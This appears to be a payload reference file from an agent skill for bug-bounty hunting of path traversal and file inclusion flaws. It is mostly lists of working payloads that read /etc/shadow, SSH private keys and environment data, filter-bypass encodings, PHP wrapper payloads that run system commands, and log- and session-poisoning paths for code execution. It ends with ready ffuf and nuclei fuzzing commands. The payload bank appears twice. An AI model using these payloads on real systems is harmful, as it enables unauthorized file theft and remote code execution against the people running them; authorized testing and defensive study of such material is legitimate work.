# Payloads — Path Traversal / LFI / RFI

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Curated payload bank (from the HackerOne corpus)

### Basic traversal

```text
../../../../etc/passwd
../../../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../home/user/.ssh/id_rsa
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Encoded traversal

```text
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%5c..%5c..%5c..%5cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..%2F..%2F..%2Fetc%2Fpasswd%00.png
```

### Filter bypass

```text
....//....//....//etc/passwd
....\....\....\windows\win.ini
..././..././..././etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
/etc/passwd%00.png
/etc/passwd%00.jpg
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc%252fpasswd
..//..//..//etc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
```

### Wrappers & absolute paths

```text
file:///etc/passwd
file:///c:/windows/win.ini
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../etc/passwd
php://filter/convert.base64-encode/resource=../config.php
phar://upload.phar/index.php
zip://upload.zip%23shell.php
data://text/plain,<?php system('id'); ?>
/etc/passwd
/proc/self/environ
C:\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

### LFI to RCE

```text
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/log/auth.log
/var/log/mail.log
..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log
..%2f..%2f..%2f..%2fproc%2fself%2fenviron
..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0
```

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Path Traversal — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `../../../../etc/passwd` `..%2f..%2f..%2fetc/passwd` `%2e%2e%2f%2e%2e%2f`

- `....//....//etc/passwd` `..\..\..\windows\win.ini` `..%c0%af..%c0%af`

- `/etc/passwd%00.png` `file:///etc/passwd` `php://filter/convert.base64-encode/resource=index`

- Zip slip -> `../../../../var/www/shell.php` in archive entry name



## Payload bank



**59 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Basic traversal



```text

../../../../etc/passwd

../../../../../../etc/passwd

../../../../etc/shadow

../../../../etc/hosts

../../../../proc/self/environ

../../../../proc/self/cmdline

../../../../var/log/apache2/access.log

../../../../var/log/nginx/access.log

../../../../home/user/.ssh/id_rsa

..\..\..\..\windows\win.ini

..\..\..\..\boot.ini

..\..\..\..\windows\system32\drivers\etc\hosts

```



### Encoded traversal



```text

..%2f..%2f..%2f..%2fetc/passwd

..%252f..%252f..%252f..%252fetc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

%2e%2e/%2e%2e/%2e%2e/etc/passwd

..%5c..%5c..%5c..%5cwindows/win.ini

%252e%252e%252f%252e%252e%252fetc/passwd

..%c0%af..%c0%af..%c0%afetc/passwd

..%e0%80%af..%e0%80%afetc/passwd

..%ef%bc%8f..%ef%bc%8fetc/passwd

%2e%2e%5c%2e%2e%5cwindows%5cwin.ini

..%2F..%2F..%2Fetc%2Fpasswd%00.png

```



### Filter bypass



```text

....//....//....//etc/passwd

....\....\....\windows\win.ini

..././..././..././etc/passwd

..;/..;/..;/etc/passwd

..%00/..%00/..%00/etc/passwd

/etc/passwd%00.png

/etc/passwd%00.jpg

....//....//....//....//etc/passwd

..%2f..%2f..%2f..%2f..%2fetc/passwd

..%252f..%252f..%252fetc%252fpasswd

..//..//..//etc/passwd

..%5c..%5c..%5cwindows%5cwin.ini

```



### Wrappers & absolute paths



```text

file:///etc/passwd

file:///c:/windows/win.ini

php://filter/convert.base64-encode/resource=index.php

php://filter/read=convert.base64-encode/resource=../../etc/passwd

php://filter/convert.base64-encode/resource=../config.php

phar://upload.phar/index.php

zip://upload.zip%23shell.php

data://text/plain,<?php system('id'); ?>

/etc/passwd

/proc/self/environ

C:\windows\win.ini

\\127.0.0.1\c$\windows\win.ini

```



### LFI to RCE



```text

/var/log/apache2/access.log

/var/log/nginx/access.log

/proc/self/fd/0

/proc/self/fd/1

/proc/self/fd/2

/tmp/sess_<PHPSESSID>

/var/lib/php/sessions/sess_<PHPSESSID>

/var/log/auth.log

/var/log/mail.log

..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log

..%2f..%2f..%2f..%2fproc%2fself%2fenviron

..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f0

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` (59)

- `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` (12 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 26× | `../` |

| 8× | `path.resolve()` |

| 6× | `path.join()` |

| 6× | `$backup_sizes` |

| 6× | `finalize_item()` |

| 6× | `/../` |

| 6× | `%2f%2e%2e%2f` |

| 5× | `wp_delete_attachment_files()` |

| 5× | `$meta['file']` |

| 5× | `dedotdotify()` |

| 5× | `$id` |

| 4× | `Buffer.from()` |

| 4× | `Curl_urldecode()` |

| 4× | `ctxt->root` |

| 4× | `openat()` |

| 4× | `%2f` |

| 4× | `to a chosen directory (in this case,` |

| 4× | `<server-IP>` |

| 3× | `$to` |

| 3× | `.attach()` |



## Parameters observed



`type` · `textdomain` · `lang` · `YEAR` · `path` · `DIR` · `name` · `SIZE` · `STYLE` · `TYPE` · `ACTIVES` · `AGE` · `DISPLAY` · `PHOT` · `SUB_PROD` · `NAV` · `YR` · `ARCHIVE` · `MO` · `PROD`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_path-traversal.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_path-traversal.txt` | 79 |

| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal.txt` | 59 |

| `~/.local/share/hackerone-reports/wordlists/payloads_path-traversal_waf.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_path-traversal.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_path-traversal.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_path-traversal.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Point the LFI fuzzers at file/download/export parameters.



```sh

nuclei -u https://target -tags lfi,traversal,path-traversal \

       -severity low,medium,high,critical -rl 40 -o nuclei_path-traversal.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/lfi -dast \

       -rl 40 -o nuclei_path-traversal_lfi.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/linux-lfi-fuzzing.yaml \

       -rl 40 -o nuclei_path-traversal_linux-lfi-fuzzing.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/windows-lfi-fuzzing.yaml \

       -rl 40 -o nuclei_path-traversal_windows-lfi-fuzzing.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
